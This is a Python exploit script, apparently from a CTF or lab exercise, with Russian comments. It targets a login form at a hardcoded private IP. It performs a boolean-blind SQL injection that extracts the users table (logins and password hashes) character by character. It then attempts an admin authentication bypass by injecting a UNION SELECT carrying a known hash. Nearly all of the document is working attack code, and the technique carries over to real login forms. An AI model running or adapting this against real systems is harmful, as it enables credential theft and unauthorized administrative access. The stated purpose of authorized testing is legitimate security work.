"""
=============================================================================
 slqi2_hard.py — Boolean-Blind SQLi в форме логина + обход авторизации admin
=============================================================================

ЗАЧЕМ:
    Двухэтапный сценарий на форме входа:
      1) extract_users() — слепым булевым дампом (маркер "Debug:") выгружает
         таблицу users (login + password/хеш) построчно, по ASCII-кодам.
      2) try_login_as_admin() — если найден пользователь 'moderator', пробует
         залогиниться как admin через UNION SELECT, подставив известный хеш
         (классический обход авторизации через UNION).

ГДЕ ПРИМЕНИМО:
    Форма логина с булевой слепой SQLi (по различимому отклику "Debug:"),
    когда цель — не просто дамп, а вход под привилегированным пользователем.

ЗАПУСК:
    python3 slqi2_hard.py   (URL и маркеры заданы в коде)

ОГРАНИЧЕНИЯ / ЗАМЕЧАНИЯ:
    - ЗАХАРДКОЖЕНО: TARGET_URL/LOGIN_URL, инъекция  login = admin' AND ...--,
      маркер "Debug:", ожидаемая структура UNION (кол-во колонок = 3).
    - Логика обхода admin рассчитана на конкретный стенд (пароль "helloworld").
    - Только для авторизованного тестирования / CTF.
=============================================================================
"""
import requests
import string

TARGET_URL = "http://172.23.170.84/index.php"
LOGIN_URL = "http://172.23.170.84/"
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://172.23.170.84",
    "Referer": "http://172.23.170.84"
}

# Проверка true/false на основе появления "Debug:"
def blind_sqli(payload):
    data = {
        "login": f"admin' AND {payload}-- ",
        "password": "test"
    }
    response = requests.post(TARGET_URL, headers=HEADERS, data=data)
    return "Debug:" in response.text

# Извлечение одного поля (например, login/password)
def extract_field(field, table, row_idx, max_len=32):
    extracted = ''
    print(f"[*] Извлекаем {field} из строки #{row_idx}")
    for pos in range(1, max_len + 1):
        found = False
        for char in string.printable:
            if char in ['%', '_']:  # избегаем спецсимволов
                continue
            ascii_code = ord(char)
            payload = f"ASCII(SUBSTRING((SELECT {field} FROM {table} LIMIT {row_idx},1),{pos},1))={ascii_code}"
            if blind_sqli(payload):
                extracted += char
                print(f"[+] {field}[{pos}] = '{char}'")
                found = True
                break
        if not found:
            print(f"[*] Конец {field}")
            break
    return extracted

# Общая функция для дампа таблицы users
def extract_users():
    users = []
    row = 0
    while True:
        print(f"\n[*] Извлекаем строку #{row}")
        login = extract_field("login", "users", row)
        if not login:
            break
        password = extract_field("password", "users", row)
        users.append((login, password))
        row += 1
    return users

# Попытка войти под admin, используя хеш moderator'а
def try_login_as_admin(known_hash, known_password):
    payload = {
        "login": f"admin' UNION SELECT 1,'admin','{known_hash}' -- -",
        "password": known_password
    }

    r = requests.post(LOGIN_URL, data=payload, headers=HEADERS)

    if "How did you get in here!?" not in r.text:
        print("\n[+] Успешный вход как admin!")
    else:
        print("\n[-] Неудача при обходе авторизации admin")
    print("\nОтвет сервера:")
    print(r.text)

if __name__ == "__main__":
    print("[*] Старт Blind SQLi и дамп таблицы users...\n")
    result = extract_users()

    print("\n[+] Дамп таблицы users:")
    for i, (login, password) in enumerate(result):
        print(f"[{i+1}] login: {login} | password: {password}")

    # Попытка входа, если найден moderator и его хеш
    for login, password in result:
        if login == "moderator":
            print("\n[*] Пытаемся обойти авторизацию admin, используя хеш moderator'а...")
            try_login_as_admin(password, "helloworld")
            break

